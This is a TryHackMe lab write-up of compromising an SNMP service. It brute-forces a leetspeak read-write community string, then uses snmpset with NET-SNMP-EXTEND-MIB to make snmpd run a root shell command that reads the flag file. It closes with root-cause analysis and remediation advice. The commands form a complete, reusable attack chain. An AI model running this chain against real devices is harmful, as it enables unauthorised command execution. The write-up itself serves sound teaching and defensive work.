# TryHackMe — Operation Takeover: SNMP RW Exploitation Writeup

> **Room type:** Network device pentesting lab
> **Focus:** SNMP enumeration, RW community string abuse, RCE via NET-SNMP-EXTEND-MIB
> **Difficulty:** Medium

## Disclaimer

This writeup documents a walkthrough of a TryHackMe lab I completed with full authorized access. The flag is partially redacted in this document to avoid spoiling the challenge for others — the methodology is complete and reproducible.

---

## 1. Recon — Initial Nmap Scan

```bash
nmap -sCV -O -p- <TARGET_IP>
```

Results:

| Port | Service | Notes |
|------|---------|-------|
| 22/tcp | OpenSSH 8.2p1 (Ubuntu) | Standard SSH, no immediate creds |
| 179/tcp | tcpwrapped | **BGP** — canonical port, router indicator |
| 2623/tcp | FRRouting 10.0 VTY | Telnet-style CLI, password-protected |

The FRRouting banner on port 2623 confirmed the target is a router running **FRR (FRRouting)**, a fork of Quagga — no surprise given the room's networking theme.

```
Hello, this is FRRouting (version 10.0).
Copyright 1996-2005 Kunihiro Ishiguro, et al.
User Access Verification
Password:
```

Default credential attempts against the VTY (`zebra`, `frr`, `quagga`, `admin`, `password`) all failed after 3 attempts per session (rate-limited).

## 2. Pivoting to UDP

With TCP vectors exhausted, a full UDP sweep was run:

```bash
sudo nmap -sU --top-ports 200 -T4 <TARGET_IP>
```

Most ports returned `open|filtered` (expected UDP scanning noise), but one stood out:

```
161/udp   open          snmp
```

This was the only definitively `open` UDP port — SNMP on a router-adjacent host is a high-value target, since it frequently discloses configuration data or, in misconfigured cases, allows write access.

## 3. SNMP Community String Discovery

Default wordlists (`onesixtyone` built-in dict, `smalldict.txt`) failed. Switching to a purpose-built SNMP wordlist succeeded:

```bash
onesixtyone -c /usr/share/wordlists/SecLists/Discovery/SNMP/common-snmp-community-strings.txt <TARGET_IP>
```

```
<TARGET_IP> [pr1v4t3] Linux <container-id> 5.15.0-1075-aws ... x86_64
```

**Key lesson:** default/small wordlists often miss leetspeak variants (`pr1v4t3` ≈ "private"). Always escalate to a dedicated SNMP wordlist (SecLists) before concluding brute-force has failed.

The `sysDescr` response also revealed the target is a **Docker container** (12-char hex hostname = container ID), running Ubuntu 20.04 on an AWS instance.

## 4. Full MIB Enumeration

```bash
snmpwalk -v2c -c pr1v4t3 <TARGET_IP>
```

The dump confirmed:
- `sysObjectID` = `1.3.6.1.4.1.8072.3.2.10` → this is **net-snmp**, not a proprietary router SNMP stack
- Running processes (`hrSWRunTable`) showed only `supervisord`, `snmpd`, `snmptrapd` — **no FRR daemons visible**, indicating this SNMP-exposed container is a *separate* service from the FRR router itself, likely for lab telemetry/scoring
- `snmptrapd` was running with `--disableAuthorization=yes`

## 5. Confirming Write Access

The community name `pr1v4t3` (leetspeak for "private") hinted at RW rather than RO access. Confirmed with a numeric OID (named OIDs failed without proper MIB resolution — see Appendix A):

```bash
snmpset -v2c -c pr1v4t3 <TARGET_IP> .1.3.6.1.2.1.1.5.0 s "test"
# → iso.3.6.1.2.1.1.5.0 = STRING: "test"
```

**RW confirmed.** However, most other standard OIDs (`sysContact`, `sysLocation`, `ifAdminStatus`, etc.) returned `notWritable` — the write access was scoped narrowly via VACM, not blanket RW across the whole MIB tree.

## 6. Exploiting NET-SNMP-EXTEND-MIB for RCE

Since this is **net-snmp** (confirmed via `sysObjectID`), the relevant escalation path is the `NET-SNMP-EXTEND-MIB` — a legitimate net-snmp feature that lets an authorized RW manager register arbitrary shell commands, which `snmpd` executes and returns the output via SNMP GET.

### 6.1 Fixing the local MIB toolchain

Ubuntu's `snmp-mibs-downloader` ships with several base modules commented out (licensing history). This must be fixed locally before symbolic OID names resolve:

```bash
apt install snmp-mibs-downloader -y
sudo sed -i 's/^mibs :/#mibs :/' /etc/snmp/snmp.conf
sudo download-mibs
```

### 6.2 Registering the extend command

```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c pr1v4t3 <TARGET_IP> \
  'nsExtendCommand."command"' s '/bin/bash' \
  'nsExtendArgs."command"' s '-c "cat /root/flag.txt"' \
  'nsExtendStatus."command"' i 4
```

Breakdown:
- `-m +NET-SNMP-EXTEND-MIB` — loads the extend MIB module *in addition to* defaults, resolving symbolic names (`nsExtendCommand`, etc.) to their numeric OIDs under `1.3.6.1.4.1.8072.1.3.2`. This resolution happens entirely client-side.
- `nsExtendCommand` — the binary to execute
- `nsExtendArgs` — arguments passed to that binary
- `nsExtendStatus i 4` — RowStatus value `4` = `createAndGo`, which creates **and** activates the row in a single SET

### 6.3 Retrieving output

```bash
snmpwalk -v2c -c pr1v4t3 <TARGET_IP> .1.3.6.1.4.1.8072.1.3.2
```

```
NET-SNMP-EXTEND-MIB::nsExtendCommand."command" = STRING: /bin/bash
NET-SNMP-EXTEND-MIB::nsExtendArgs."command" = STRING: -c "cat /root/flag.txt"
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."command" = STRING: THM{SNMP_SO_NOT_MY_...
NET-SNMP-EXTEND-MIB::nsExtendResult."command" = INTEGER: 0
```

`snmpd` executed the command with its own process privileges (root inside the container), and returned the contents of `/root/flag.txt` directly over SNMP.

## 7. Flag

```
THM{SNMP_SO_NOT_MY_█████████}
```

*(Redacted — final segment withheld to preserve the challenge for other learners.)*

---

## Root Cause Analysis

**Vulnerability class:** CWE-284 (Improper Access Control) combined with insecure-by-default SNMP RW exposure.

The root cause is a classic SNMP misconfiguration chain:
1. A weak/guessable RW community string (`pr1v4t3`) was reachable over the network.
2. VACM (View-based Access Control Model) restricted write access to *most* of the MIB tree, but **did not exclude `NET-SNMP-EXTEND-MIB`**, which is a command-execution primitive by design.
3. `snmpd` ran with elevated (root) privileges inside its container, so any command registered via `nsExtendCommand` executed with full filesystem read access.

This mirrors real-world findings: SNMP is frequently deployed for monitoring with default or weak community strings, and administrators often forget that **RW SNMP on a net-snmp agent is functionally equivalent to remote code execution** if the extend MIB isn't explicitly disabled or excluded from the writable view.

## Remediation

- Never expose SNMP RW community strings on production/perimeter-facing hosts.
- If RW SNMP is required, explicitly restrict VACM views to exclude `1.3.6.1.4.1.8072.1.3.2` (`nsExtendObjects`) and any other command-execution-capable subtree.
- Run `snmpd` under a dedicated low-privilege service account, never root.
- Use SNMPv3 with authentication + privacy (authPriv) instead of v1/v2c community strings.
- Monitor for unexpected `nsExtendConfigTable` writes as an IOC.

---

## Appendix A — Troubleshooting Notes

### A.1 Named vs. numeric OIDs

Early attempts using symbolic OID names (`nsExtendStatus."command"`) failed with `Unknown Object Identifier` because the local `snmp-mibs-downloader` package ships with several interdependent base MIBs disabled by default (a long-standing Debian/Ubuntu packaging quirk). This is purely a **client-side** limitation — it has no bearing on target-side access control. Using numeric OIDs (e.g. `.1.3.6.1.2.1.1.5.0`) sidesteps the issue entirely and should be the first fallback when MIB resolution fails.

### A.2 RowStatus semantics

`nsExtendStatus` follows the standard SNMP `RowStatus` textual convention:

| Value | Meaning |
|-------|---------|
| 1 | active |
| 4 | createAndGo (create + activate in one SET) |
| 5 | createAndWait |
| 6 | destroy |

Attempting `createAndGo` on a row name that already exists returns `inconsistentValue` — this is expected RowStatus behavior, not an access control failure. Use a fresh object name (e.g. `"flag"` → `"command"`) or `destroy` the existing row first.
